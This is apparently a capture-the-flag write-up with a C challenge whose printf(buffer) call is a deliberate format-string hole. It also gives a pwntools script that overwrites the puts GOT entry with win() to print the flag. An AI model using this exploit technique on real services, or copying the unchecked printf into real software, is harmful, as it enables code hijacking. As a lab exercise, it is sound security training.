Given C code:

`Just_print_in.c`:
```c
/*gcc -fno-stack-protector -no-pie -z execstack -g -Wno-implicit-function-declaration in.c -o out*/
#include <stdio.h>
#include <stdlib.h>

void win() {
    FILE *fp;
    char flag[128];

    fp = fopen("flag.txt", "r");
    if (!fp) {
        puts("Error opening flag file.");
        fflush(stdout);
        exit(1);
    }

    fgets(flag, sizeof(flag), fp);
    printf("Flag: %s\n", flag);

    fflush(stdout);
    fclose(fp);
    exit(0);
}

int main() {
    char buffer[128];

    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    fflush(stdout);

    fgets(buffer, sizeof(buffer), stdin);

    printf(buffer);
    puts("\nGoodbye!");
    return 0;
}
```
Compile it accordingly:
```
gcc -fno-stack-protector -no-pie -z execstack -g -Wno-implicit-function-declaration in.c -o out
```


Our script:

`script.py`:
```python
from pwn import *

context.binary = exe = ELF("./chall", checksec=False)
context.log_level = "debug"

def GDB():
	gdb.attach(p, gdbscript='''
		br *main+107
		br *main+139
		''')

#nc.umbccd.net:8925
# p = remote("nc.umbccd.net", 8925)

p = process(exe.path)
GDB()

win = exe.sym['win']
target = exe.got['puts']
offset = 6

payload = fmtstr_payload(offset, {target: win})
print(f"payload: {payload}\n")

p.sendline(payload)

p.interactive()
```


Output:

<img width="805" height="790" alt="image" src="https://github.com/user-attachments/assets/1f576024-4932-458c-b070-bf11958c358e" />

<img width="804" height="551" alt="image" src="https://github.com/user-attachments/assets/23aa20a2-532c-4aac-a8d0-c5aa9b49a42d" />
